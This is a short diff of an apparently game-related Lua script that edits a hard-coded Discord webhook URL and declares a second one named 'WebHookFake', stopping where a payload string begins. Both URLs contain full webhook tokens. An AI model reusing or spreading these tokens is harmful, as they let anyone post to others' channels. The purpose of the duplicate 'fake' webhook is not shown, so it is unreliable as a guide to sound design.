@@ -308,7 +308,7 @@ end
 local world = GetWorld()
 
 if world and world.name then
-local WebHook = "https://discordapp.com/api/webhooks/1366742348146409472/G7GWF8DKq8pcyA3o1SrH4wTIg5NxW1-wRstdwLguN9qHRbZ5I_J0UvuYotv8pAMkD4--mc"
+local WebHook = "https://discordapp.com/api/webhooks/1366742348146409472/G7GWF8DKq8pcyA3o1SrH4wTIg5NxW1-wRstdwLguN9qHRbZ5I_J0UvuYotv8pAMkD4mc"
 local WebHookFake = "https://discordapp.com/api/webhooks/1369588633744707604/criPqPVEvqF1uwI8n1J15pvAgR0F25pV-2poNepF4Fmnc2haU6FIqjgw8x9zipbUvtyy"
 
 local payload = [[
